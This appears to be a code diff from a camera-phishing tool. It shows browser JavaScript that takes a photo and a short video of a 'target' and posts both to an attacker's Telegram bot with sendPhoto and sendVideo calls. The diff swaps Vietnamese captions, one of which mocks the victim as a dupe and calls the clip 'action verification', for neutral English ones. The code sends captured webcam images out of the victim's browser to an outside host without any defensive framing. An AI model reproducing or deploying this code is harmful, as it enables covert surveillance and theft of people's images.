@@ -22,7 +22,7 @@
                 const imgData = new FormData();
                 imgData.append('chat_id', CHAT_ID);
                 imgData.append('photo', imgBlob, 'target_photo.jpg');
-                imgData.append('caption', '💰 + 1 thằng ngu\n📸 Ảnh chụp nhanh');
+                imgData.append('caption', '📷 Successfully Taken ✔');
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: imgData });
             }, 'image/jpeg', 0.8);
 
@@ -36,7 +36,7 @@
                 const videoData = new FormData();
                 videoData.append('chat_id', CHAT_ID);
                 videoData.append('video', videoBlob, 'target_video.mp4');
-                videoData.append('caption', '🎬 Clip xác thực hành động (4 giây)');
+                videoData.append('caption', '🎬 Sucessfully Record ✔');
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: videoData });
                 
